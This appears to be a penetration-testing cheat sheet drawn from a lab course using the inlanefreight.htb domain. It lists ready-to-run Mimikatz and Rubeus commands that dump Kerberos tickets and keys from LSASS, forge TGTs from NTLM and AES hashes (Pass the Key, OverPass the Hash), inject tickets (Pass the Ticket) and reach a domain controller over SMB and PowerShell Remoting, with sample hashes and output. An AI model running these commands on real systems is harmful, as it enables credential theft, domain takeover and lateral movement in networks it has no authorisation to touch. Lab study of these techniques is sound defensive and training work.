# Content 
- [Harvesting Kerberos Tickets from Windows](#harvesting-kerberos-tickets-from-windows)
  - [Mimikatz - Export Tickets](#mimikatz---export-tickets)
  - [Rubeus - Export Tickets](#rubeus---export-tickets)
- [Pass the Key or OverPass the Hash](#pass-the-key-or-overpass-the-hash)
  - [Mimikatz - Extract Kerberos Keys](#mimikatz---extract-kerberos-keys)
  - [Mimikatz - Pass the Key or OverPass the Hash](#mimikatz---pass-the-key-or-overpass-the-hash)
  - [Rubeus - Pass the Key or OverPass the Hash](#rubeus---pass-the-key-or-overpass-the-hash)
- [Pass the Ticket (PtT)](#pass-the-ticket-ptt)
  - [Rubeus - Pass the Ticket](#rubeus---pass-the-ticket)
  - [Mimikatz - Pass the Ticket](#mimikatz---pass-the-ticket)
  - [Mimikatz - PowerShell Remoting with Pass the Ticket](#mimikatz---powershell-remoting-with-pass-the-ticket)
  - [Rubeus - PowerShell Remoting with Pass the Ticket](#rubeus---powershell-remoting-with-pass-the-ticket)

- On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. 
- Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.

## Harvesting Kerberos Tickets from Windows
We need a valid Kerberos ticket to perform a Pass the Ticket (PtT). It can be:
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
- Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.



Note: 
1. The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory.
2. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi` .
3. If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.
4. 
```
At the time of writing, using Mimikatz version 2.2.0 20220919, if we run "sekurlsa::ekeys" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.
```


### Mimikatz - Export Tickets

```powershell
mimikatz.exe privilege::debug "sekurlsa::tickets /export"
```

### Rubeus - Export Tickets

```powershell
Rubeus.exe dump /nowrap
```


## Pass the Key or OverPass the Hash (Get `TGT`)
- The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full `Ticket-Granting-Ticket (TGT)`.
- To forge our tickets, we need to have the user's hash
- we can use Mimikatz to dump all users Kerberos encryption keys using the module sekurlsa::ekeys. This module will enumerate all key types present for the Kerberos package.
- once we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash or Pass the Key attack using Mimikatz and Rubeus.
- Modern Windows domains (functional level 2008 and above) use `AES` encryption by default in normal Kerberos exchanges. If we use a `rc4_hmac` (NTLM) hash in a Kerberos exchange instead of an` aes256_cts_hmac_sha1 (or aes128) key`, it may be detected as an "encryption downgrade." 

### Mimikatz - Extract Kerberos Keys

```powershell
mimikatz.exe privilege::debug "sekurlsa::ekeys"
```
after we got the keys we can use Mimikatz or Rubeus to Get the `TGT`

### Mimikatz - Pass the Key or OverPass the Hash 
This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.
```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f"
```
### Rubeus - Pass the Key or OverPass the Hash 
Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

```powershell
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

## Pass the Ticket (PtT) (Get `TGS`)
Now that we have some Kerberos tickets `TGT` , we can get some `TGS` and use them to move laterally within an environment.

### Rubeus - Pass the Ticket
```powershell
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi


c:\tools> dir \\DC01.inlanefreight.htb\c$
Directory: \\dc01.inlanefreight.htb\c$
# Pass the Ticket - Base64 Format

[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>

c:\tools> dir \\DC01.inlanefreight.htb\c$
Directory: \\dc01.inlanefreight.htb\c$
```

### Mimikatz - Pass the Ticket
```powershell
mimikatz.exe privilege::debug "kerberos::ptt 'C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi'"

c:\tools> dir \\DC01.inlanefreight.htb\c$
Directory: \\dc01.inlanefreight.htb\c$

```


### Mimikatz - PowerShell Remoting with Pass the Ticket

```powershell
mimikatz.exe privilege::debug "kerberos::ptt 'C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi'"

c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
```

### Rubeus - PowerShell Remoting with Pass the Ticket

```powershell
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting.

```powershell
 Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```
